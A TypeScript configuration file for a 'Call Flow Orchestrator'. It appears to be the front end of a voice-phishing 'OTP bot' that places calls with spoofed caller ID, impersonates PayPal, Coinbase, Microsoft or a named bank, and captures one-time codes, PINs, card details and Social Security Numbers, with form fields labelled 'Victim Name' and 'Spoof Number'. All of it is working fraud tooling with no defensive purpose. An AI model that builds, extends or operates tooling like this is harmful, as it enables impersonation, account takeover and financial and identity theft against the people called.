import { CallScenario, ScenarioType } from './types';

export const APP_NAME = "Call Flow Orchestrator";

export const AVAILABLE_SCENARIOS: CallScenario[] = [
  {
    type: ScenarioType.GENERIC_OTP,
    displayName: 'Generic OTP',
    description: 'Requests an OTP code for a specified service. OTP will be displayed here for validation.',
    backendRouteTemplate: '/voice/{targetNumber}/{spoofNumber}/{service}/{name}/{otpDigits}',
    fields: [
      { name: 'targetNumber', label: 'Target Phone Number', type: 'text', placeholder: 'e.g., 15551234567', required: true },
      { name: 'spoofNumber', label: 'Spoof Number', type: 'text', placeholder: 'e.g., 18001234567', required: true },
      { name: 'service', label: 'Service Name', type: 'text', placeholder: 'e.g., PayPal, Coinbase', required: true },
      { name: 'name', label: 'Victim Name', type: 'text', placeholder: 'e.g., John Doe', required: true },
      { name: 'otpDigits', label: 'OTP Digits Length', type: 'number', placeholder: 'e.g., 6', required: true },
    ],
    expectsOtpValidation: true,
  },
  {
    type: ScenarioType.PGP_FORWARD,
    displayName: 'PGP Forward Call',
    description: 'Initiates a call and forwards it to another number upon victim action.',
    backendRouteTemplate: '/pgp/{targetNumber}/{spoofNumber}/{name}/{service}/{forwardToNumber}',
    fields: [
      { name: 'targetNumber', label: 'Target Phone Number', type: 'text', required: true },
      { name: 'spoofNumber', label: 'Spoof Number', type: 'text', required: true },
      { name: 'service', label: 'Service Announcing As', type: 'text', placeholder: 'e.g., Support Line', required: true },
      { name: 'name', label: 'Victim Name', type: 'text', required: true },
      { name: 'forwardToNumber', label: 'Forward Call To', type: 'text', placeholder: 'Your number to connect to', required: true },
    ],
    expectsOtpValidation: false,
  },
  {
    type: ScenarioType.CARD_INFO,
    displayName: 'Card Information Capture',
    description: 'Attempts to capture credit card details. Validation might occur for parts of this flow.',
    backendRouteTemplate: '/card/{targetNumber}/{spoofNumber}/{name}/{bankName}',
    fields: [
      { name: 'targetNumber', label: 'Target Phone Number', type: 'text', required: true },
      { name: 'spoofNumber', label: 'Spoof Number', type: 'text', required: true },
      { name: 'name', label: 'Victim Name', type: 'text', required: true },
      { name: 'bankName', label: 'Bank Name', type: 'text', placeholder: 'e.g., Chase, Bank of America', required: true },
    ],
    expectsOtpValidation: true, // Assuming parts of card info (like a final OTP/CVC) might need web UI validation
  },
  {
    type: ScenarioType.SSN_INFO,
    displayName: 'SSN Capture',
    description: 'Attempts to capture Social Security Number. OTP validation may be involved.',
    backendRouteTemplate: '/ssn/{targetNumber}/{spoofNumber}/{name}',
    fields: [
      { name: 'targetNumber', label: 'Target Phone Number', type: 'text', required: true },
      { name: 'spoofNumber', label: 'Spoof Number', type: 'text', required: true },
      { name: 'name', label: 'Victim Name', type: 'text', required: true },
    ],
    expectsOtpValidation: true,
  },
  {
    type: ScenarioType.PIN_CAPTURE,
    displayName: 'PIN Capture',
    description: 'Attempts to capture a PIN for a service. PIN will be displayed here for validation.',
    backendRouteTemplate: '/pin/{targetNumber}/{spoofNumber}/{service}/{name}/{otpDigits}', // otpDigits here means PIN length
    fields: [
      { name: 'targetNumber', label: 'Target Phone Number', type: 'text', required: true },
      { name: 'spoofNumber', label: 'Spoof Number', type: 'text', required: true },
      { name: 'service', label: 'Service Name', type: 'text', required: true },
      { name: 'name', label: 'Victim Name', type: 'text', required: true },
      { name: 'otpDigits', label: 'PIN Length', type: 'number', placeholder: 'e.g., 4', required: true },
    ],
    expectsOtpValidation: true,
  },
   {
    type: ScenarioType.MICROSOFT_OTP,
    displayName: 'Microsoft OTP',
    description: 'Specific OTP script for Microsoft services. OTP will be displayed here for validation.',
    backendRouteTemplate: '/voice/{targetNumber}/{spoofNumber}/microsoft/{name}/6', // Service is fixed, OTP length fixed
    fields: [
      { name: 'targetNumber', label: 'Target Phone Number', type: 'text', required: true },
      { name: 'spoofNumber', label: 'Spoof Number', type: 'text', required: true },
      { name: 'name', label: 'Victim Name', type: 'text', required: true },
    ],
    expectsOtpValidation: true,
  },
  {
    type: ScenarioType.BANK_OTP,
    displayName: 'Bank OTP',
    description: 'Requests an OTP for a banking service. OTP will be displayed here for validation.',
    backendRouteTemplate: '/bank/{targetNumber}/{spoofNumber}/{bankName}/{name}/{otpDigits}',
    fields: [
      { name: 'targetNumber', label: 'Target Phone Number', type: 'text', required: true },
      { name: 'spoofNumber', label: 'Spoof Number', type: 'text', required: true },
      { name: 'bankName', label: 'Bank Name', type: 'text', required: true },
      { name: 'name', label: 'Victim Name', type: 'text', required: true },
      { name: 'otpDigits', label: 'OTP Digits Length', type: 'number', placeholder: 'e.g., 6', required: true },
    ],
    expectsOtpValidation: true,
  },
  // Add other scenarios based on Python backend routes (EMAIL_CODE, CVV_CAPTURE, CRYPTO_OTP)
  // For brevity, only a few are detailed here.
];
